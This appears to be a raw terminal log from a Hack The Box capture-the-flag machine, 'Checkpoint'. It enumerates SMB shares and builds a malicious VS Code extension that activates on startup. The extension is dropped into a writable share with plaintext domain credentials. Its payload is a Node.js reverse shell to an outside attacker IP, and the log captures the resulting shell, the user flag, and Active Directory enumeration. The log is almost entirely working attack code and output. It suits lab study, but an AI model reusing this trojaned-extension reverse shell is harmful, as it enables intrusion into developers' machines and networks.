SMB         10.129.83.74    445    DC01             Share           Permissions     Remark
SMB         10.129.83.74    445    DC01             -----           -----------     ------
SMB         10.129.83.74    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.83.74    445    DC01             C$                              Default share
SMB         10.129.83.74    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.83.74    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.83.74    445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.83.74    445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.83.74    445    DC01             VMBackups
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                  ✔ │ 6s ─╮
╰─                                                                                                                   ─╯


```

``` bash

❯ mkdir checkpoint-vsix
❯ cd checkpoint-vsix
❯ npm init -y

Wrote to /home/joel/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix/package.json:

{
  "name": "checkpoint-vsix",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
}


❯ npm install --save-dev @vscode/vsce
npm WARN deprecated whatwg-encoding@3.1.1: Use @exodus/bytes instead for a more spec-conformant and faster implementation
npm WARN deprecated prebuild-install@7.1.3: No longer maintained. Please contact the author of the relevant native addon; alternatives are available.

added 283 packages, and audited 284 packages in 15s

85 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix                                               ✔ │ 16s ─╮
╰─                                                                                                                   ─╯

```

``` json

{
  "name": "checkpoint-test",
  "displayName": "Checkpoint Test",
  "version": "1.0.0",
  "engines": {
    "vscode": "^1.118.0"
  },
  "activationEvents": [
    "*"
  ],
  "main": "./extension.js"
}

```

``` js

const vscode = require("vscode");
const https = require("https");

function activate(context) {
    const options = {
        hostname: "10.10.15.166",
        port: 8000,
        path: "/checkpoint-vsix",
        method: "GET"
    };

    const req = https.request(options, (res) => {
        console.log(`PoC callback: HTTP ${res.statusCode}`);
    });

    req.on("error", (err) => {
        console.error(`PoC callback failed: ${err.message}`);
    });

    req.end();

    vscode.window.showInformationMessage("Checkpoint VSIX activated");
}

function deactivate() {}

module.exports = {
    activate,
    deactivate
};

```

``` bash

❯ ls
extension.js  node_modules  package.json  package-lock.json
❯ npx vsce package
 WARNING  A 'repository' field is missing from the 'package.json' manifest file.
Use --allow-missing-repository to bypass.
Do you want to continue? [y/N] y
 WARNING  Using '*' activation is usually a bad idea as it impacts performance.
More info: https://code.visualstudio.com/api/references/activation-events#Start-up
Use --allow-star-activation to bypass.
Do you want to continue? [y/N] y
 WARNING  LICENSE, LICENSE.md, or LICENSE.txt not found
Do you want to continue? [y/N] y
 WARNING  This extension consists of 12019 files, out of which 4020 are JavaScript files. For performance reasons, you should bundle your extension: https://aka.ms/vscode-bundle-extension. You should also exclude unnecessary files by adding them to your .vscodeignore: https://aka.ms/vscode-vscodeignore.

 WARNING  Neither a .vscodeignore file nor a "files" property in package.json was found. To ensure only necessary files are included in your extension, add a .vscodeignore file or specify the "files" property in package.json. More info: https://aka.ms/vscode-vscodeignore

 INFO  Files included in the VSIX:
checkpoint-test-1.0.0.vsix
├─ [Content_Types].xml
├─ extension.vsixmanifest
└─ extension/
   ├─ extension.js [0.61 KB]
   ├─ package.json [0.2 KB]
   └─ node_modules/ (12015 files) [91.84 MB]

=> Run vsce ls --tree to see all included files.

 DONE  Packaged: /home/joel/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix/checkpoint-test-1.0.0.vsix (12019 files, 31.36 MB)
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix                                               ✔ │ 39s ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put checkpoint-test-1.0.0.vsix'
putting file checkpoint-test-1.0.0.vsix as \checkpoint-test-1.0.0.vsix (9768.4 kB/s) (average 9768.4 kB/s)
❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'ls'
  .                                   D        0  Fri Aug 28 12:03:00 2026
  ..                                  D        0  Sat May  9 16:42:27 2026
  checkpoint-test-1.0.0.vsix          A 32879317  Fri Aug 28 12:03:03 2026

                10459391 blocks of size 4096. 2455711 blocks available
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix                                                     ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.83.74 - - [28/Aug/2026 05:04:59] code 400, message Bad request version ('«Þïh£\\x00ªÆA')
10.129.83.74 - - [28/Aug/2026 05:04:59] "\x16\x03\x01\x00á\x01\x00\x00Ý\x03\x03¤V´\x9cÁÊ"\x80\x05ï£\x0bPG¿ÚÔ\x04Öwo°\x00Ä8÷\x7f¹q(þ" «Þïh£\x00ªÆA" 400 -

```


``` json

{
  "name": "checkpoint-test",
  "displayName": "Checkpoint Test",
  "version": "1.0.0",
  "engines": {
    "vscode": "^1.118.0"
  },
  "activationEvents": [
    "*"
  ],
  "main": "./extension.js"
}

```


``` js

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.15.166", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();

```

``` bash

❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put checkpoint-test-1.0.0.vsix'
putting file checkpoint-test-1.0.0.vsix as \checkpoint-test-1.0.0.vsix (9744.6 kB/s) (average 9744.6 kB/s)

```


``` bash

❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.166] from (UNKNOWN) [10.129.83.74] 50677
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Program Files\Microsoft VS Code> whoami
whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code>

```

``` bash

PS C:\Users\ryan.brooks\Desktop> pwd
pwd

Path
----
C:\Users\ryan.brooks\Desktop


PS C:\Users\ryan.brooks\Desktop> type user.txt
type user.txt
5f<REDACTED>46
PS C:\Users\ryan.brooks\Desktop>

```


``` bash

PS C:\Users\ryan.brooks\Desktop> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes   
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
CHECKPOINT\VPN-Users                       Group            S-1-5-21-3129162710-3498938529-1807524340-1109 Mandatory group, Enabled by default, Enabled group
CHECKPOINT\DevTeam                         Group            S-1-5-21-3129162710-3498938529-1807524340-1110 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                 
PS C:\Users\ryan.brooks\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\ryan.brooks\Desktop>

```


``` bash

❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get children --direct

distinguishedName: CN=Builtin,DC=checkpoint,DC=htb

distinguishedName: CN=Computers,DC=checkpoint,DC=htb

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb

distinguishedName: OU=Domain Controllers,DC=checkpoint,DC=htb

distinguishedName: OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb

distinguishedName: CN=Infrastructure,DC=checkpoint,DC=htb

distinguishedName: CN=Keys,DC=checkpoint,DC=htb

distinguishedName: CN=LostAndFound,DC=checkpoint,DC=htb

distinguishedName: CN=Managed Service Accounts,DC=checkpoint,DC=htb

distinguishedName: CN=NTDS Quotas,DC=checkpoint,DC=htb

distinguishedName: CN=Program Data,DC=checkpoint,DC=htb

distinguishedName: OU=ServiceAccounts,DC=checkpoint,DC=htb

distinguishedName: CN=System,DC=checkpoint,DC=htb

distinguishedName: CN=TPM Devices,DC=checkpoint,DC=htb

distinguishedName: CN=Users,DC=checkpoint,DC=htb
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                     ✔ ─╮
╰─                                                                                                                   ─╯

```


